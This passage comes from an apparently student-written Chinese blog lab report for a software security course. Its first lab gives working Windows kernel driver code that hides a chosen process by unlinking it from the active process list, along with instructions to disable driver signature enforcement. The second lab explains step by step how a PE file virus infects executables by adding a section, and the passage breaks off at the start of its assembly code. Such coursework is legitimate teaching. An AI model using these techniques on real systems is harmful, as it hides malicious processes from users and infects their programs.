<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="软件安全实验报告, ShiQuLiZhi BLOG">
    <meta name="description" content="Record the study life of an ordinary college student">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>软件安全实验报告 | ShiQuLiZhi BLOG</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>


    
        <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>

            

                <body>

                    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">ShiQuLiZhi BLOG</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/goodpapers" class="waves-effect waves-light">
      
      <i class="fas fa-coffee" style="zoom: 0.6;"></i>
      
      <span>收藏</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">ShiQuLiZhi BLOG</div>
        <div class="logo-desc">
            
            Record the study life of an ordinary college student
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/goodpapers" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-coffee"></i>
			
			收藏
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

                        
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">软件安全实验报告</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">
                                        信息安全
                                    </span>
                                </a>
                                
                                <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">
                                        软件安全
                                    </span>
                                </a>
                                
                        </div>
                        
                </div>
                <div class="col s5 right-align">
                    
                        <div class="post-cate">
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                                <a href="/categories/%E4%BD%9C%E4%B8%9A/" class="post-category">
                                    作业
                                </a>
                                
                        </div>
                        
                </div>
            </div>

            <div class="post-info">
                
                    <div class="post-date info-break-policy">
                        <i class="far fa-calendar-minus fa-fw"></i>
                        发布日期:&nbsp;&nbsp;
                            2023-01-20
                    </div>
                    

                        
                            <div class="post-date info-break-policy">
                                <i class="far fa-calendar-check fa-fw"></i>
                                更新日期:&nbsp;&nbsp;
                                    2023-01-23
                            </div>
                            

                                
                                    <div class="info-break-policy">
                                        <i class="far fa-file-word fa-fw"></i>
                                        文章字数:&nbsp;&nbsp;
                                            27.3k
                                    </div>
                                    

                                        
                                            <div class="info-break-policy">
                                                <i class="far fa-clock fa-fw"></i>
                                                阅读时长:&nbsp;&nbsp;
                                                    106
                                                        分
                                            </div>
                                            

                                                
            </div>
        </div>
        <hr class="clearfix">

        
            <!-- 是否加载使用自带的 prismjs. -->
            <link rel="stylesheet" href="/libs/prism/prism.css">
            

                
                    <!-- 代码块折行 -->
                    <style type="text/css">
                        code[class*="language-"],
                        pre[class*="language-"] {
                            white-space: pre-wrap !important;
                        }
                    </style>
                    

                        <div class="card-content article-card-content">
                            <div id="articleContent">
                                <h1 id="软件安全实验报告"><a href="#软件安全实验报告" class="headerlink" title="软件安全实验报告"></a>软件安全实验报告</h1><h1 id="实验一-进程与进程隐藏"><a href="#实验一-进程与进程隐藏" class="headerlink" title="实验一 进程与进程隐藏"></a>实验一 进程与进程隐藏</h1><h2 id="一、实验要求"><a href="#一、实验要求" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>试利用 <code>windbg</code>、<code>DDK</code> 或 <code>SoftICE</code> 查看 <code>EProcess</code> 和 <code>PEB</code> 中活动进程相关信息，绘制出当前活动进程双向链表在内核态和用户态下的进程链表结构，并设计“断链”方法利用这两个结构体实现自己任意指定进程在任务管理器中的隐藏。</p>
<h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p><strong>Windows内核结构体</strong>如下表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">描述</th>
<th style="text-align:center">数据结构</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">双链表</td>
<td style="text-align:center">LIST_ENTRY</td>
</tr>
<tr>
<td style="text-align:center">进程和线程</td>
<td style="text-align:center">EPROCESS, KPROCESS, ETHREAD, KTHREAD</td>
</tr>
<tr>
<td style="text-align:center">内核  &amp; HAL</td>
<td style="text-align:center">KPCR, KINTERRUPT, CONTEXT, KTRAP_FRAME, KDPC, KAPC,  KAPC_STATE</td>
</tr>
<tr>
<td style="text-align:center">异步对象</td>
<td style="text-align:center">DISPATCHER_HEADER, KEVENT, KSEMAPHORE, KMUTANT, KTIMER, KGATE,  KQUEUE</td>
</tr>
<tr>
<td style="text-align:center">执行体  &amp; RTL</td>
<td style="text-align:center">IO_WORKITEM</td>
</tr>
<tr>
<td style="text-align:center">I/O管理器</td>
<td style="text-align:center">IRP, IO_STACK_LOCATION, DRIVER_OBJECT, DEVICE_OBJECT, DEVICE_NODE, FILE_OBJECT</td>
</tr>
<tr>
<td style="text-align:center">对象和句柄</td>
<td style="text-align:center">OBJECT_HEADER, OBJECT_TYPE, HANDLE_TABLE_ENTRY</td>
</tr>
<tr>
<td style="text-align:center">内存管理器</td>
<td style="text-align:center">MDL, MMPTE, MMPFN,  MMPFNLIST, MMWSL, MMWSLE, POOL_HEADER, MMVAD</td>
</tr>
<tr>
<td style="text-align:center">缓存管理器</td>
<td style="text-align:center">VACB, VACB_ARRAY_HEADER, SHARED_CACHE_MAP, PRIVATE_CACHE_MAP, SECTION_OBJECT_POINTERS</td>
</tr>
</tbody>
</table>
</div>
<p>Windows内核使用 <code>ERPROCESS</code> 结构体来表示一个进程，其包含了内核需要去保存关乎该进程的信息。对每一个运行在系统中的进程包括 <code>System Process</code> 和 <code>System Idle Process</code> 来说，都有一个对应的 <code>EPROCESS</code>结构。</p>
<p><code>EPROCESS</code> 结构属于内核的执行体层，包含了进程的资源相关信息诸如句柄表、虚拟内存、安全、调试、异常、创建信息、I/O转移统计以及进程计时等。任何进程都可以同时隶属于多个集合或组。例如，一个进程总是在系统中<code>active</code> 进程列表中，一个进程可以属于内部运行着一个会话的进程集合，一个进程也可以是某个 <code>job</code> 的一部分。为了实现这些集合或组，<code>EPROCESS</code> 结构通过不同的字段持有数个列表项。</p>
<p><code>ActiveProcessLink</code> 字段用于将该 <code>EPROCESS</code> 结构链入系统中 <code>active</code> 进程链表，该链表的头保存在内核变量中 <code>PsActiveProcessHead</code>。类似的，<code>SessionProcessLinks</code> 字段用于将该 <code>EPROCESS</code> 结构链入到一个会话链表，链表头在 <code>MM_SESSION_SPACE.ProcessList</code>。<code>JobLinks</code> 字段用于将该<code>EPROCESS</code> 结构链入到所属的job链表中，链表头在 <code>EJOB.ProcessListHead</code>。内存管理器全局变量 <code>MmProcessList</code> 通过 <code>MmProcessLinks</code> 字段链入了一个进程链表。该链表可以通过 <code>MiReplicatePteChange()</code>横贯以更新内核模式中关于进程虚拟地址空间的那部分。</p>
<p>属于进程的所有线程链表保存在 <code>ThreadListHead</code> 中，线程通过 <code>ETHREAD.ThreadListEntry</code> 排队。内核变量 <code>ExpTimerResolutionListHead</code> 持有一个进程链表，使用 <code>NtSetTimerResolution()</code> 来改变定时器间隔。该链表被 <code>ExpUpdateTimerResolution()</code>函数使用来更新时间分辨率到所有进程中需求值最小对应的进程。</p>
<h2 id="三、实验具体步骤"><a href="#三、实验具体步骤" class="headerlink" title="三、实验具体步骤"></a>三、实验具体步骤</h2><h3 id="3-1-活动进程相关信息与进程链表结构"><a href="#3-1-活动进程相关信息与进程链表结构" class="headerlink" title="3.1 活动进程相关信息与进程链表结构"></a>3.1 活动进程相关信息与进程链表结构</h3><p>我们以 <code>Windows10(x64)</code> 为实验环境进行实验。我们<strong>使用 <code>windbg</code>( <code>x64</code>，以管理员身份)软件</strong>进行下面的操作。首先 <code>Ctrl + K</code> 进入本地内核 <code>Debug</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221129202705619.png" alt="image-20221129202705619"></p>
<p>在Windows内核中有一个活动进程链表 <code>ActiveProcessLinks</code>，它是一个双向链表，保存着系统中所有进程的 <code>EPROCESS</code> 结构，如下图所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221203112659710.png" alt="image-20221203112659710"></p>
<p>在一定的偏移量(本 <code>Win 10(x64)</code> 环境中的偏移量为 <code>0x2f0</code>)处，存在活动进程链表，如上图红色框所示。下表列出了不同系统活动进程链表 <code>ActiveProcessLinks</code> 相对于 <code>EPROCESS</code> 结构体的偏移量：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">Win XP</th>
<th style="text-align:center">Win 7</th>
<th style="text-align:center">Win 8.1</th>
<th style="text-align:center">Win 10</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">32 Bits</td>
<td style="text-align:center"><code>0x088</code></td>
<td style="text-align:center"><code>0xB8</code></td>
<td style="text-align:center"><code>0xB8</code></td>
<td style="text-align:center"><code>0xB8</code></td>
</tr>
<tr>
<td style="text-align:center">64 Bits</td>
<td style="text-align:center"><code>0x088</code></td>
<td style="text-align:center"><code>0x188</code></td>
<td style="text-align:center"><code>0x2E8</code></td>
<td style="text-align:center"><code>0x2F0</code></td>
</tr>
</tbody>
</table>
</div>
<p>我们查看活动进程链表的结构，如下图所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221203112806037.png" alt="image-20221203112806037"></p>
<p>由图中可看出该结构为双向链表，有 <code>Flink</code>和 <code>Blink</code> 两个指针。</p>
<p>我们列出当前系统的所有进程，使用 <code>!process 0 0</code> 命令：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107134458758.png" alt="image-20230107134458758"></p>
<p>我们观察到当前系统存在 <code>ImageFileName</code> 为 <code>Calculator.exe</code> 的进程：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107113938013.png" alt="image-20230107113938013"></p>
<p>我们查看<code>Calculator.exe</code>的<code>EPROCESS</code>结构，使用 <code>dt _EPROCESS ffffe001df0b7080</code> 命令：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107114024297.png" alt="image-20230107114024297"></p>
<p><code>PEB</code> 域是一个进程的进程环境块(<code>PEB Process Environment Block</code>)，其是位于进程地址空间(即用户模式空间)的内存块。我们查看 <code>Calculator.exe</code> 的 <code>PEB</code>，使用<code>dt _PEB ffffe001df0b7080</code>命令：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107114538581.png" alt="image-20230107114538581"></p>
<p>结合以上分析，我们绘制本 <code>Windows10(x64)</code> 环境中当前活动进程双向链表在内核态和用户态下的进程链表结构如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107141143198.png" alt="image-20230107141143198"></p>
<h3 id="3-2-隐藏进程加载的模块"><a href="#3-2-隐藏进程加载的模块" class="headerlink" title="3.2 隐藏进程加载的模块"></a>3.2 隐藏进程加载的模块</h3><p>本实验中，我们应用 <code>Windbg Preview</code> 软件以实现双机(主机+虚拟机)调试。</p>
<p>基于第一小节对 <code>EPROCESS</code> 的分析，结合我们的 <code>Windows10(x64)</code>的环境，我们知道，活动进程链表在 <code>EPROCESS</code> 偏移量为 <code>0x2f0</code> 处，而 <code>ImageFileName</code>在 <code>EPROCESS</code> 偏移量为<code>0x448</code>处。</p>
<p>我们拟在任务管理器中隐藏的进程为 <code>Calculator.exe</code>，实现隐藏的方法描述如下：</p>
<p>通过  <code>ActiveProcessLinks</code>活动进程链表结构遍历进程。在遍历每个进程的过程中，先通过 <code>strcmp</code> 函数将 <code>ImageFileName</code> 与 <code>Calculator.exe</code> 进行比较，若找到目标进程，则<strong>把上一个节点的 <code>Blink</code> 改成自己的下一个节点，把下一个节点的 <code>Flink</code> 改成自己的上一个节点</strong>，即可实现隐藏。</p>
<p>隐藏进程方法的示意图如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107112400509.png" alt="image-20230107112400509" style="zoom: 67%;" /></p>
<p><code>Windows</code> 驱动开发环境采用 <code>Visual Studio 2019</code> 进行开发。配置完相应环境后，先选择 <code>Empty WDM Driver</code> 创建一个空工程，编写以下代码：</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntifs.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;String.h></span></span>

<span class="token comment">//卸载函数</span>
VOID <span class="token function">DriverUnload</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriverObject<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Driver Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

	PEPROCESS eprocess <span class="token operator">=</span> <span class="token function">IoGetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	PCHAR name <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	PLIST_ENTRY next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> first <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	next <span class="token operator">=</span> first <span class="token operator">=</span> <span class="token punctuation">(</span>PLIST_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG64<span class="token punctuation">)</span>eprocess <span class="token operator">+</span> <span class="token number">0x2f0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// list偏移量为0x2f0, ImageFileName偏移量为0x448</span>
	<span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// 0x448 - 0x2f0 == 0x158</span>
		name <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG64<span class="token punctuation">)</span>next <span class="token operator">+</span> <span class="token number">0x158</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>name<span class="token punctuation">,</span> <span class="token string">"Calculator.exe"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			next<span class="token operator">-></span>Blink<span class="token operator">-></span>Flink <span class="token operator">=</span> next<span class="token operator">-></span>Flink<span class="token punctuation">;</span>
			next<span class="token operator">-></span>Flink<span class="token operator">-></span>Blink <span class="token operator">=</span> next<span class="token operator">-></span>Blink<span class="token punctuation">;</span>
			<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Succeed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		next <span class="token operator">=</span> <span class="token punctuation">(</span>PLIST_ENTRY<span class="token punctuation">)</span>next<span class="token operator">-></span>Blink<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>next<span class="token operator">-></span>Blink <span class="token operator">!=</span> first<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token comment">//驱动入口</span>
NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriverObject<span class="token punctuation">,</span> PUNICODE_STRING pRegPath<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">//设置卸载函数</span>
	pDriverObject<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> DriverUnload<span class="token punctuation">;</span>
	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Driver load succeed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过编译、创建解决方案后将后缀为 <code>.sys</code> 的驱动程序保存至虚拟机环境中。我们使用 <code>Windows</code> 驱动加载工具<code>DriverMonitor</code> 加载驱动，使用 <code>DebugView</code> 用于监视本地系统上的调试输出。由于我们的驱动程序未经过签名，故我们还需在虚拟机环境中禁用Win10系统驱动程序强制签名(步骤为设置-&gt;更新和安全-&gt;恢复-&gt;高级启动-&gt;更改相关设置)。</p>
<p>进行上述准备操作后，我们打开计算器软件 (<code>Calculator.exe</code>)，然后在<code>DriverMonitor</code> 中加载我们之前写好的驱动，并点击 <code>Go</code>。可以看到，在任务管理器中的该进程被隐藏。</p>
<p>操作截图如下：</p>
<p>(操作界面)：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230105234536329.png" alt="image-20230105234536329"></p>
<p>(未运行驱动的任务管理器截图)：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230105234810535.png" alt="image-20230105234810535"></p>
<p>(运行驱动后的任务管理器截图)：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230105234500692.png" alt="image-20230105234500692"></p>
<h1 id="实验二-PE文件病毒核心机制的实现"><a href="#实验二-PE文件病毒核心机制的实现" class="headerlink" title="实验二 PE文件病毒核心机制的实现"></a>实验二 PE文件病毒核心机制的实现</h1><h2 id="一、实验要求-1"><a href="#一、实验要求-1" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>完成一个简单的 <code>PE</code> 文件病毒核心机制的实现，具体要求如下：</p>
<ol>
<li>自定义可执行文件的搜索范围；</li>
<li>要求能够自动识别 <code>PE</code> 文件类型；</li>
<li>利用节插入、节扩展或节添加（三者任选一种）方式完成病毒在PE文件中的感染机制；</li>
<li>利用注册表的系统调用 <code>API</code> 函数（创建键 <code>RegCreateKeyEx</code>、打开一个键 <code>RegOpenKeyEx</code>、读取键 <code>RegQueryValueEx</code>、设置键值 <code>RegSetValueEx</code>、删除键值 <code>RegDeketeKey</code>）实现一种系统配置的修改，作为一种对系统使用过程中的病毒破坏机制；</li>
</ol>
<p>要求利用 <code>C</code> 或 <code>C++</code>，也可以利用 <code>MASM32</code> 或 <code>HAL</code> 语言（高级汇编语言）实现；实验的软件工具请事先自己准备好。</p>
<h2 id="二、实验原理-1"><a href="#二、实验原理-1" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p>一个 <code>PE</code> 文件中的常用区段如下：</p>
<ul>
<li><code>.text</code>：代码段，可读、可执行；</li>
<li><code>.data</code>：存放全局变量、全局常量等；</li>
<li><code>.idata</code>：导入函数的代码段，存放外部函数地址；</li>
<li><code>.rdata</code>：资源数据段（包括自己打包的，还有开发工具打包的）；</li>
<li><code>.reloc</code>：实现重定位</li>
</ul>
<p><code>PE</code> 病毒编写的关键技术主要是：</p>
<ul>
<li>定位</li>
<li>获取 <code>API</code> 函数</li>
<li>搜索目标文件</li>
<li>感染</li>
<li>破坏</li>
</ul>
<p>实现对PE文件病毒的感染有三种方式：</p>
<p><strong>方法1：节添加</strong></p>
<p>1、判断目标文件开始的两个字节是否为“<code>MZ</code>”；</p>
<p>2、判断PE文件的标记（“<code>PE</code>”）；</p>
<p>3、判断感染标记，如果已被感染过就跳出，去执行宿主程序，否则继续；</p>
<p>4、获得数据目录(<code>Data Directory</code>)的个数（每个数据目录占8个字节）；</p>
<p>5、得到节表的起始地址（数据目录的偏移地址+数据目录占用的字节数=节表起始位置）</p>
<p>6、得到节表的末尾偏移（紧接其后用于写入一个新的病毒节信息），节表的起始地址+节的个数*28H（每个节表占用的字节数）=节表的末尾偏移</p>
<p>7、开始写入节表：</p>
<p>a）写入节名（8字节）。</p>
<p>b）写入节的实际字节数（4字节）。</p>
<p>c）写入新节在内存中的开始偏移地址（4字节），同时可以计算出病毒入口位置。 上一个节在内存中的开始偏移地址+（上一个节的大小/节对齐+1）*节对齐=本节在内存中的开始偏移地址。</p>
<p>d）写入本节（即病毒节）在文件中对齐后的大小。</p>
<p>e）写入本节在文件中的开始位置。 上节在文件中的开始位置+上节对齐后的大小=本节（即病毒）在文件中的开始位置。</p>
<p>8、修改映像文件头的节表数目</p>
<p>9、修改 <code>AddressOfEntryPoint</code>（即程序入口点指向病毒入口位置），同时保存旧的 <code>AddressOfEntryPoint</code>，以便返回宿主并继续执行。</p>
<p>10、更新 <code>SizeOfImage</code>（内存中整个<code>PE</code> 映像尺寸=原 <code>SizeOfImage</code> +病毒节经过内存节对齐后的大小）。</p>
<p>11、写入感染标记（后面例子中是放在 <code>PE</code> 头中）。</p>
<p>12、在新添加的节中写入病毒代码。</p>
<p>示意图如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107142545623.png" alt="image-20230107142545623"></p>
<p><strong>方法2：节扩展</strong></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107142633871.png" alt="image-20230107142633871"></p>
<p><strong>方法3：节插入</strong>（利用空闲区修改PE）</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107142711345.png" alt="image-20230107142711345"></p>
<h2 id="三、实验具体步骤-1"><a href="#三、实验具体步骤-1" class="headerlink" title="三、实验具体步骤"></a>三、实验具体步骤</h2><p>本实验采用 <code>MASM32</code> 汇编语言进行代码实现，采用 <code>RadASM</code> 工具进行开发，并在 <code>Win XP</code> 环境进行测试。</p>
<p>在本实验中，我们分别使用<strong>节添加、节扩展、节插入</strong>三种方法进行PE文件病毒的感染，并在感染后实现在打开被感染的 <code>exe</code> 后进行弹窗的机制。</p>
<p>我们首先设计以下窗体(保存在 <code>.dlg</code> 文件中)，三种方法的病毒感染对应不同密码(loong、xp、cuit)，当输入其余字符串时会显示密码错误：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107003114626.png" alt="image-20230107003114626"></p>
<h3 id="3-1-节添加"><a href="#3-1-节添加" class="headerlink" title="3.1 节添加"></a>3.1 节添加</h3><p>节添加中需要进行以下操作：</p>
<p>增加 <code>IMAGE_SECTION_HEADER</code>，设置节属性，计算起偏移、<code>RVA</code>等，并修改节表数、<code>SizeOfCode</code>，将插入代码写入新加的节区，修改文件入口点，修正跳转到原入口点指令。具体来看有以下步骤：</p>
<p>首先进行预处理，打开文件：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">invoke	lstrcpy,addr @szNewFile,f_Name
